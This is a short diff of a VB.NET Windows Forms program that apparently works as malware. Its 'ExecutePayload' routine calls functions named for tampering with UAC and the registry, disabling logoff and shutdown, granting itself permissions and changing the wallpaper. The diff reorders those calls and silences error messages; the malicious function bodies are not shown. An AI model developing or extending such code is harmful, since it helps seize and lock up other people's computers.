@@ -740,7 +740,7 @@ Public Class Form1
             LockRegistryKey(regKeyPath)
 
         Catch ex As Exception
-            MessageBox.Show("An error occurred while updating UAC: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            Console.WriteLine("An error occurred while updating UAC: " & ex.Message)
         End Try
     End Sub
 
@@ -1167,6 +1167,7 @@ Public Class Form1
     Private Sub ExecutePayload()
 
         ' Execute remaining operations
+        SetWallpaper()
         WriteMessageToNotepad()
         GrantSelfPermissions()
         VisualEffectTimer.Start()
@@ -1175,7 +1176,6 @@ Public Class Form1
         ' Update registry settings and disable Log off
         UpdateRegistrySettings()
         DisableLogoffSwitchUserAndShutdown()
-        SetWallpaper()
     End Sub
 
     ' Event handler for the Exit button
